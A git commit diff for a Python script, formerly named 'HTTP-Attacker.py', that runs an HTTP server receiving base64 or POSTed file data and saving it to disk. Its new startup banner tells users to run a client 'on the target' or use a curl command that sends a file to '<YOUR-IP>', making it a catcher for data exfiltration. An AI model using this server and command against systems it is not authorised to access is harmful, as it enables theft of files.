2195fcafaf385c6744f39985b9b8d25612b7d94c
Henryisnotavailable <112469853+Henryisnotavailable@users.noreply.github.com>
2023-09-10 09:49:59 +0000

    Update and rename HTTP-Attacker.py to HTTP-Server.py

--- python/HTTP-Server.py
+++ python/HTTP-Server.py
@@ -5,8 +5,13 @@ import http.server
 import base64
 import logging
 import sys
+import datetime
+import re
+
+
+
 # Configure logging
-logging.basicConfig(level=logging.ERROR, format='%(levelname)s: %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
 
 class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -22,6 +27,7 @@ class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
                 if self.server.output_dir:
                     with open(os.path.join(self.server.output_dir, f_name), "wb") as f:
                         f.write(decoded_data)
+                        print(f"Saved to {os.path.join(self.server.output_dir, f_name)}")
                 
                 # Respond with a success message
                 response_message = "Decryption successful. Hello, world!"
@@ -41,13 +47,45 @@ class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
             # If the custom header is not present, serve files as usual
             super().do_GET()
 
+    def do_POST(self):
+
+        content_length = int(self.headers["Content-Length"]);
+        file_content = self.rfile.read(content_length);
+        #print(self.headers)
+        
+        if 'Expect' in self.headers and self.headers['Expect'] == '100-continue':
+            self.send_response(100)
+            self.end_headers()
+
+
+        content_disposition = self.headers.get('Content-Disposition') or "";
+
+        match = re.search(r'filename="(.+)"', content_disposition)
+        
+        if match:
+            filename = match.group(1)
+        else:
+            filename = datetime.datetime.now().strftime("%m_%d_%Y_%H_%M_%S")
+
+        if self.server.output_dir:
+            with open(os.path.join(self.server.output_dir, filename), "wb") as f:
+                f.write(file_content)
+            
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b'<h1>Good Response! </h1>\n');
+            
+            print(f"Saved file to {os.path.join(self.server.output_dir,filename)}");
+
+
+
 class CustomHTTPServer(socketserver.TCPServer):
     def __init__(self, server_address, RequestHandlerClass, output_dir=None):
         self.output_dir = output_dir
         super().__init__(server_address, RequestHandlerClass)
 
 def main():
-    parser = argparse.ArgumentParser(description="HTTP Server with Custom Options")
+    parser = argparse.ArgumentParser(description="HTTP Server to allow for simple file transfer")
 
     parser.add_argument(
         "-l",
@@ -90,7 +128,17 @@ def main():
             CustomRequestHandler,
             output_dir=output_dir,
         )
-        print(f"Server is listening on {listen_host}:{port}...")
+
+        output =  "==========================[SERVER IS UP]========================\n";
+        output += "|                                                              |\n";
+        output += "| Server is listening on {listen_host}:{port}...               |\n";
+        output += "| To send data use HTTP-Client.py on the target                |\n";
+        output += "| Or use `curl http://<YOUR-IP>/ --data-binary @/path/to/file  |\n";
+        output += "|                                                              |\n";
+        output += "================================================================\n";
+        #print(f"Server is listening on {listen_host}:{port}...");
+        #print(f"Use HTTP-Client.py to send data from the host\n or use\n curl http://<YOUR-IP>/ --data-binary @/path/to/file");
+        print(output);
         server.serve_forever()
     except KeyboardInterrupt:
         print("\nServer stopped.")
